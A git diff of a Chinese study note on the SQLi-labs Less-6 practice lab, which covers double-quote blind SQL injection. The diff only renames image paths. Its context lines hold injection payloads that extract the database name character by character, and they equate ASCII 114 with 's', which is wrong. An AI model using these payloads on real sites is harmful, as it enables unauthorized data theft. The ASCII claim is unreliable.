@@ -2,9 +2,9 @@
 
 **?id=1 正常**
 **?id=1" 报错**
-![](assets/Less6/file-20260530145118656.png)
+![](assets/Less-6/file-20260530180141985.png)
 **?id=1" --+** **正常**
-![](assets/Less6/file-20260530145250875.png)
+![](assets/Less-6/file-20260530180141981.png)
 
 **关于"闭合**
 
@@ -35,7 +35,7 @@ select ascii(substr(database(),1,1)) < 100;
 
 ?id=1" and (select ascii(substr(database(),1,1))) >114 --+也行
 
-![](assets/Less6/file-20260530150534319.png)
+![](assets/Less-6/file-20260530180141976.png)
  所以库名第一个字母的ascii编码为114  ——s
  ---
  用脚本跑
